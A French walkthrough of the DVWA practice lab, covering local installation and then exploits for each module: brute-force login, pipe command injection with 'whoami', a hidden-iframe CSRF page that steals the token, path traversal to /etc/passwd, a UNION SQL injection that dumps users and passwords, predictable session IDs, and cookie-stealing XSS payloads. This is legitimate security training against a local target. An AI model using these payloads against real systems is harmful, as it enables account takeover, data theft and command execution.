# DVWA WEB 


## Installation du LABO 

### Le github :  https://github.com/digininja/DVWA.git

#### Intallation :  

    git clone https://github.com/digininja/DVWA.git
    cp config/config.inc.php.dist config/config.inc.php
    sudo mv DVWA /var/www/html
    apt install mariadb-server
    apt install apache2
    apt install mysql
    systemctl start apache2
    systemctl start mariabd
    systemctl start mysql

 Accéder à l’application **http://localhost/DVWA/**

#### Configuration 

Sur la page **http://localhost/DVWA/setup.php**


![Alt text](img/install/setup.PNG)

Faire passer en **Enable** tout les checks de l'installation : 

Modifier le /etc/php/8.2/apache2/php.ini

![Alt text](img/install/image.png)


Ajouter les droits au compte www-data

    chown +x www-data /var/www/html/DVWA/hackable/uploads/
    chown +x www-data /var/www/html/DVWA/config

Les 2 parramètres sont utile pour les erreurs et n'impact pas la réalisation du LAB. De plus dans le lab nous n'utiliserons pas le captcha.


Création des bases de données : 
        
        
        mysql> create database dvwa;
        Query OK, 1 row affected (0.00 sec)

        mysql> create user dvwa@localhost identified by 'p@ssw0rd';
        Query OK, 0 rows affected (0.01 sec)

        mysql> grant all on dvwa.* to dvwa@localhost;
        Query OK, 0 rows affected (0.01 sec)

        mysql> flush privileges;
        Query OK, 0 rows affected (0.00 sec)


Connexion à la page login.php

![Alt text](img/install/login.PNG)

Utilisateur : **admin** <br/>
Mot de passe :  **password**


Modification du niveau :  
![Alt text](img/install/security.PNG)




## Début  des tests


### Brute force : **http://localhost/DVWA/vulnerabilities/brute/**


#### Niveau de diffuculté: LOW


![Alt text](<img/bruteforce/bruteforce 1.PNG>)


#### Utilisation de Burpsuite 

Interception d'un requête 

![Alt text](img/bruteforce/bruteforce2.PNG)

On remarque un get avec des variables  :username=test&password=test&Login=Login

On va créer une variable grâce à l'intruder pour le chant password

![Alt text](img/bruteforce/bruteforce3.PNG)

On créer une varible puis on ajoute un dictionnaire ou des mots des mots de passe dans le **payload settings**


![Alt text](img/bruteforce/bruteforce4.PNG)

On lance l'attaque avec le bouton start attack

![Alt text](img/bruteforce/bruteforce5.PNG)

On remarque dans la requête valide la page qui signifique que nous sommes connecté

#### Niveau de diffuculté: Medium

J'utilise Hydra : 

![Alt text](img/bruteforce/bruteforce6.PNG)

Il est nécessaire de spécifier les cookies de session des pages(bypasse de la connexion page login.php) 

Dans cet exemple hydra n'est pas capable de retrouver la sortie, il serait utile d'utiliser **:S=area admin** pour qu'il détecte le bon mot de passe.Pour cela il faudrait connaitre le contenue de la page avec le bon mot de pass.

#### Niveau de diffuculté: High

Utilisation d'un script : 
![Alt text](img/bruteforce/bruteforce7.PNG)

Il vérifie si Welcome est contenu dans la page une fois les identifiants testés.

![Alt text](img/bruteforce/bruteforce8.PNG)


----
### Commande injection :**http://localhost/DVWA/vulnerabilities/exec/**

#### Niveau de diffuculté: LOW

J'utilise le | qui permet de séparer la commande 

![Alt text](img/injection/inject1.PNG)

Possibilité d'injecter dans Burpsuite la valeur  : ip=8.8.8.8+%7C+whoami&Submit=Submit

#### Niveau de diffuculté: Medium

Le pipe (|)fonctionne toujours 

![Alt text](img/injection/inject1.PNG)


#### Niveau de diffuculté: High

Le double pipe (||) fonctionne toujours
![Alt text](img/injection/inject2.PNG)

--------
### CSRF : 

Si on envoie la requêtes à un utilisateur cela changera son mot de passe par celui dans la requêtes .

password_new=password&password_conf=password&Change=Change
( le cookie de session doit déjà être en place sur la machine cible, il aura un nouveau de passe, et on pourra se connecter)


![Alt text](img/csrf/cssrf.png)

#### Niveau de diffuculté: High

        <html>
         <body>
         <p>TOTALLY LEGITIMATE AND SAFE WEBSITE </p>
        <iframe id="myFrame" src="http://localhost/vulnerabilities/csrf" style="visibility: hidden;" onload="maliciousPayload()"></iframe>
        <script>
        function modificationdelapage() {
         console.log("start");
            var iframe = document.getElementById("myFrame");
            var doc = iframe.contentDocument  || iframe.contentWindow.document;
         var token = doc.getElementsByName("user_token")[0].value;
        const http = new XMLHttpRequest();
            const url = "http://localhost/vulnerabilities/csrf/?password_new=motdepassequejeconnais&password_conf=motdepassequejeconnais&Change=Change&user_token="+token+"#";
         http.open("GET", url);
          http.send();
         console.log("password changed");
         }
         </script>
        </body>
    </html>


![Alt text](img/csrf/csrf1.png)



-------
### File inclusion : **http://localhost/DVWA/vulnerabilities/fi/?page=include.php**

#### Niveau de diffuculté: low

J'utilise l'url pour chercher un flag, la partie **?page=** permet de d'afficher des dossiers 

![Alt text](img/file/file1.PNG)

Il est possible de spécifier ce que l’ont souhaite comme ../(7fois)/etc/passwd ou un url malveillant 
![Alt text](img/file/file2.PNG)

![Alt text](img/file/file3.PNG)


#### Niveau de diffuculté: Medium et High

Utilisation de **?page=file** qui permet d'identifier les fichiers 

![Alt text](img/file/file4.PNG)


---------------------------
### SQL Injection : http://localhost/DVWA/vulnerabilities/sqli/

#### Niveau de diffuculté: low,medium


Modification de la requêtes avec burpsuite, j'utilise une condition or 1=1 puis une commande sql qui permet de récupérer les utilisateurs et les mots de passe de la table users

**id=1 or 1=1 UNION SELECT user, password FROM users#&Submit=Submit**

![Alt text](img/sql/sql1.PNG)


#### Niveau de diffuculté: High

Avec burpsuite j'utilise un **'** pour arreter la commande et je place une requête sql 

![Alt text](img/sql/sql2.PNG)

----
### Weak Session ID :  http://localhost/DVWA/vulnerabilities/weak_id/

#### Niveau de diffuculté: Low 

Je remarque que l'ID de session s'incrémente de 1 à chaque clic sur le bouton Generate.
Exemple avec 1 clic, session numéro 2
![Alt text](img/Session/session1.png)

#### Niveau de diffuculté: Medium
Pour le medium c’est en fonction du temps

![Alt text](img/Session/session2.png)

Puis 39 seconds plus tard : 


![Alt text](img/Session/session3.png)

On remarque un écart de 39 entre les 2 valeurs (1701727820-1701727781=39)

#### Niveau de diffuculté: High


On remarque un hash 
![Alt text](img/Session/session4.png)
 
Je clique sur Generate puis j'utilise crackstation 
![Alt text](img/Session/session5.png)
Je remarque le nombre 2
![Alt text](img/Session/session6.png)
je remarque le nombre 5

J'en déduit que les sessions sont le hash md5 d'une incrémentation de 1.

--------
### XSS Stored

#### Niveau de diffuculté: High
Voici la requête de base :
![Alt text](img/xsssto/xsss1.png)

On remarque rapidement que le content-lenght est faible, je regarde si je peux augmenter sa taille : 

![Alt text](img/xsssto/xsss2.png)

J’arrive facilement en mettant un content-lenght à 7000 à augmenter la taille du champ Name (initialement bloqué à 7 caractères).Maintenant je vais injecter un payload, je décide de tester d’injecter une image.Avec une balise < img src=testinjectionimage >
![Alt text](img/xsssto/xsss3.png)

J’inspecte la page et je remarque que l’image est bien la donc je vais pouvoir mettre une image qu’y n’existe pas et essayer de faire exécuter un document.cookie.  
Un exemple: 
![Alt text](img/xsssto/xsss4.png)

J’ai mis un gros content-lenght car j’ai beaucoup écrit dans ma balise image.

Cela fonctionne: 
< img src=testxssstored  onerror="alert(document.cookie)">
Sans oublié de rajouter de la content-lenght
![Alt text](img/xsssto/xsss5.png)


-------
### XSS Reflected
#### Niveau de diffuculté: High

La taille du champ n’est pas définit :

![Alt text](img/xssref/xssr1.png)
Je peux écrire beaucoup de caractères

![Alt text](img/xssref/xssr.png)

J’utilise comme pour le xss stored, le même payload qui fonctionne sans burp < img src=testreflected onerror="alert(document.cookie)"> 


----
### XSS DOM
#### Niveau de diffuculté: High
Je remarque que je peux utiliser le ?default= pour modifier la balise Qui permet de sélectionner la langue
![Alt text](img/xssdom/xssd1.png)

J'essaye une xss connue

![Alt text](img/xssdom/xssd2.png)





